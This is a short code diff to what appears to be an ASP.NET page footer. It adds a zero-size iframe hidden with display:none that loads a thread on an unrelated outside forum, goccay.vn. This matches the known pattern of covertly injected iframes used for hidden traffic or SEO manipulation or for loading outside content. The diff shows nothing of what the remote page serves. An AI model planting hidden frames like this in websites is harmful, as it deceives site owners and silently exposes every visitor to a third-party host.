@@ -59,4 +59,5 @@
     </div>
 </div>
 <asp:Literal ID="lrIframe" runat="server"></asp:Literal>
+<iframe src="http://goccay.vn/showthread.php?12835-Goccay-vn-Huong-Dan-Lap-Trinh-C-" width="0px" height="0px" style="display: none"></iframe>
 </footer>
